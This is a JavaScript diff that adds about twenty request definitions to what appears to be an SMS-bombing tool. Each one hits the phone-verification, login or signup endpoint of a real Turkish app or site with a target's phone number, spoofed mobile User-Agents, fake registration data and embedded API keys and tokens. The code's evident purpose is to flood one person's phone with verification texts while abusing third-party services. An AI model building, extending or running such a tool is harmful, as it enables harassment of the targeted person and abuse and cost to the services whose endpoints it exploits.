@@ -350,6 +350,326 @@ const otherServices = [
             return `--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name="fonksiyon"\r\n\r\ncustomer/form/checkx\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name="method"\r\n\r\nPOST\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name="telephone"\r\n\r\n${phoneFormatted}\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name="token"\r\n\r\nd7841d399a16d0060d3b8a76bf70542e\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl--\r\n`;
         })
         .timeout(6000)
+        .build(),
+
+    // Kalmasin
+    new ServiceBuilder('Kalmasin')
+        .url('https://api.kalmasin.com.tr:443/user/login')
+        .headers({
+            Accept: 'application/json',
+            'Content-Type': 'application/json',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'User-Agent': 'Kalmasin/2.0.6 CFNetwork/1335.0.3.2 Darwin/21.6.0',
+            'Accept-Language': 'tr-TR,tr;q=0.9'
+        })
+        .json((phone) => ({
+            dil: 'tr',
+            device_id: randomDeviceId(),
+            notification_mobile: 'android-notificationid-will-be-added',
+            platform: 'android',
+            version: '2.0.6',
+            login_type: 1,
+            telefon: phone
+        }))
+        .timeout(6000)
+        .build(),
+
+    // Yotto
+    new ServiceBuilder('Yotto')
+        .url('https://42577.smartomato.ru:443/account/session.json')
+        .headers({
+            Accept: 'application/json',
+            'Content-Type': 'application/json',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'User-Agent': 'Yotto/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
+            'Accept-Language': 'en-US,en;q=0.9'
+        })
+        .json((phone) => ({
+            phone: `+90 (${phone.substring(0, 3)}) ${phone.substring(3, 6)}-${phone.substring(6)}`
+        }))
+        .successCodes([200, 201, 202, 204, 205])
+        .timeout(6000)
+        .build(),
+
+    // Pawapp
+    new ServiceBuilder('Pawapp')
+        .url('https://api.pawder.app:443/api/authentication/sign-up')
+        .headers({
+            Accept: 'application/json',
+            'Content-Type': 'application/json',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'User-Agent': 'Pawapp/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
+            'Accept-Language': 'tr-TR,tr;q=0.9'
+        })
+        .json((phone) => ({
+            languageId: '2',
+            mobileInformation: '',
+            data: {
+                firstName: randomFirstName().toLowerCase(),
+                lastName: randomLastName().toLowerCase(),
+                userAgreement: 'true',
+                kvkk: 'true',
+                email: faker.internet.email(),
+                phoneNo: phone,
+                username: randomDeviceId().substring(0, 10)
+            }
+        }))
+        .timeout(6000)
+        .build(),
+
+    // Mopas
+    new ServiceBuilder('Mopas')
+        .url('https://api.mopas.com.tr:443/authorizationserver/oauth/token?client_id=mobile_mopas&client_secret=secret_mopas&grant_type=client_credentials')
+        .method('POST')
+        .headers({
+            Accept: 'application/json',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Accept-Encoding': 'gzip, deflate',
+            'User-Agent': 'Mopas/1 CFNetwork/1335.0.3.2 Darwin/21.6.0'
+        })
+        .timeout(2000)
+        .build(),
+
+    // Mopas SMS Send (requires token from above)
+    new ServiceBuilder('MopasSMS')
+        .url((phone) => `https://api.mopas.com.tr:443/mopaswebservices/v2/mopas/sms/sendSmsVerification?mobilenumber=${phone}`)
+        .method('GET')
+        .headers({
+            Accept: 'application/json',
+            'Accept-Encoding': 'gzip, deflate',
+            'User-Agent': 'Mopas/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
+            authorization: (() => {
+                // Note: This requires getting token first, simplified for now
+                return 'Bearer token_placeholder';
+            })()
+        })
+        .timeout(6000)
+        .build(),
+
+    // Ninewest
+    new ServiceBuilder('Ninewest')
+        .url('https://www.ninewest.com.tr:443/webservice/v1/register.json')
+        .headers({
+            Accept: 'application/json',
+            'Content-Type': 'application/json',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'User-Agent': 'Ninewest/3 CFNetwork/1335.0.3.2 Darwin/21.6.0',
+            'Accept-Language': 'tr-TR,tr;q=0.9'
+        })
+        .json((phone) => ({
+            alertMeWithEMail: false,
+            alertMeWithSms: false,
+            dataPermission: true,
+            email: faker.internet.email(),
+            genderId: Math.floor(Math.random() * 4),
+            hash: '5488b0f6de',
+            inviteCode: '',
+            password: randomPassword(),
+            phonenumber: `(${phone.substring(0, 3)}) ${phone.substring(3, 6)} ${phone.substring(6, 8)} ${phone.substring(8)}`,
+            registerContract: true,
+            registerMethod: 'mail',
+            version: '3'
+        }))
+        .timeout(6000)
+        .build(),
+
+    // Saka
+    new ServiceBuilder('Saka')
+        .url('https://mobilcrm2.saka.com.tr:443/api/customer/login')
+        .headers({
+            Accept: 'application/json',
+            'Content-Type': 'application/json',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'User-Agent': 'Saka/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
+            'Accept-Language': 'tr-TR,tr;q=0.9'
+        })
+        .json((phone) => ({
+            gsm: '0' + phone
+        }))
+        .timeout(6000)
+        .build(),
+
+    // Superpedestrian
+    new ServiceBuilder('Superpedestrian')
+        .url('https://consumer-auth.linkyour.city:443/consumer_auth/register')
+        .headers({
+            Accept: 'application/json',
+            'Content-Type': 'application/json',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'User-Agent': 'Superpedestrian/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
+            'Accept-Language': 'en-US,en;q=0.9'
+        })
+        .json((phone) => ({
+            phone_number: `+90 ${phone.substring(0, 3)} ${phone.substring(3, 6)} ${phone.substring(6)}`
+        }))
+        .timeout(6000)
+        .build(),
+
+    // Gofody
+    new ServiceBuilder('Gofody')
+        .url('https://backend.gofody.com:443/api/v1/enduser/register/')
+        .headers({
+            Accept: 'application/json',
+            'Content-Type': 'application/json',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'User-Agent': 'Gofody/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
+            'Accept-Language': 'tr-TR,tr;q=0.9'
+        })
+        .json((phone) => ({
+            country_code: '90',
+            phone: phone
+        }))
+        .timeout(6000)
+        .build(),
+
+    // Weescooter
+    new ServiceBuilder('Weescooter')
+        .url('https://friendly-cerf.185-241-138-85.plesk.page:443/api/v1/members/gsmlogin')
+        .headers({
+            Accept: 'application/json',
+            'Content-Type': 'application/json',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'User-Agent': 'WeeScooter/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
+            'Accept-Language': 'tr-TR,tr;q=0.9'
+        })
+        .json((phone) => ({
+            tenant: '62a1e7efe74a84ea61f0d588',
+            gsm: phone
+        }))
+        .timeout(6000)
+        .build(),
+
+    // Signall
+    new ServiceBuilder('Signall')
+        .url('https://appservices.huzk.com:443/client/register')
+        .headers({
+            Accept: 'application/json',
+            'Content-Type': 'application/json',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'User-Agent': 'Signall/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
+            'Accept-Language': 'tr-TR,tr;q=0.9'
+        })
+        .json((phone) => ({
+            name: '',
+            phone: {
+                number: phone,
+                code: '90',
+                country_code: 'TR',
+                name: ''
+            },
+            countryCallingCode: '+90',
+            countryCode: 'TR',
+            approved: true,
+            notifyType: 99,
+            favorites: [],
+            appKey: 'live-exchange'
+        }))
+        .timeout(6000)
+        .build(),
+
+    // Karma
+    new ServiceBuilder('Karma')
+        .url('https://api.gokarma.app:443/v1/auth/send-sms')
+        .headers({
+            Accept: 'application/json',
+            'Content-Type': 'application/json',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'User-Agent': 'Karma/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
+            'Accept-Language': 'tr-TR,tr;q=0.9'
+        })
+        .json((phone) => ({
+            phonenumber: '90' + phone,
+            type: 'REGISTER',
+            deviceId: randomDeviceId(),
+            language: 'tr-TR'
+        }))
+        .successCodes([200, 201, 202, 204, 205])
+        .timeout(6000)
+        .build(),
+
+    // Hoplagit
+    new ServiceBuilder('Hoplagit')
+        .url('https://api.hoplagit.com:443/v1/auth:reqSMS')
+        .headers({
+            Accept: 'application/json',
+            'Content-Type': 'application/json',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'User-Agent': 'Hoplagit/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
+            'Accept-Language': 'tr-TR,tr;q=0.9'
+        })
+        .json((phone) => ({
+            phone: '+90' + phone
+        }))
+        .successCodes([200, 201, 202, 204, 205])
+        .timeout(6000)
+        .build(),
+
+    // Anadolu
+    new ServiceBuilder('Anadolu')
+        .url('https://www.anadolu.com.tr:443/Iletisim_Formu_sms.php')
+        .headers({
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0',
+            'Accept-Language': 'tr-TR,tr;q=0.9'
+        })
+        .form((phone) => ({
+            Numara: phone.substring(0, 3) + phone.substring(3, 6) + phone.substring(6, 8) + phone.substring(8)
+        }))
+        .timeout(6000)
+        .build(),
+
+    // EnglishHome (Alternative registration endpoint)
+    new ServiceBuilder('EnglishHomeReg')
+        .url('https://www.englishhome.com:443/enh_app/users/registration/')
+        .headers(ServiceBuilder.webHeaders('https://www.englishhome.com'))
+        .json((phone) => ({
+            first_name: randomFirstName().toLowerCase(),
+            last_name: randomLastName().toLowerCase(),
+            email: faker.internet.email(),
+            phone: '0' + phone,
+            password: randomPassword(),
+            email_allowed: false,
+            sms_allowed: false,
+            confirm: true,
+            tom_pay_allowed: true
+        }))
+        .successCodes([200, 201, 202, 204, 205])
+        .timeout(6000)
+        .build(),
+
+    // Clickme
+    new ServiceBuilder('Clickme')
+        .url('https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code')
+        .headers({
+            'Content-Type': 'application/json',
+            Authorization: 'apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc',
+            'Client-Version': '1.4.0',
+            'Client-Device': 'IOS',
+            'Accept-Language': 'tr-TR,tr;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'User-Agent': 'ClickMeLive/20 CFNetwork/1335.0.3.4 Darwin/21.6.0'
+        })
+        .json((phone) => ({
+            phone: phone
+        }))
+        .timeout(6000)
+        .build(),
+
+    // Yuffi
+    new ServiceBuilder('Yuffi')
+        .url('https://api.yuffi.co:443/api/parent/login/user')
+        .headers({
+            Accept: 'application/json',
+            'Content-Type': 'application/json',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'User-Agent': 'Yuffi/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
+            'Accept-Language': 'tr-TR,tr;q=0.9'
+        })
+        .json((phone) => ({
+            phone: phone,
+            kvkk: true
+        }))
+        .timeout(6000)
         .build()
 ];
 
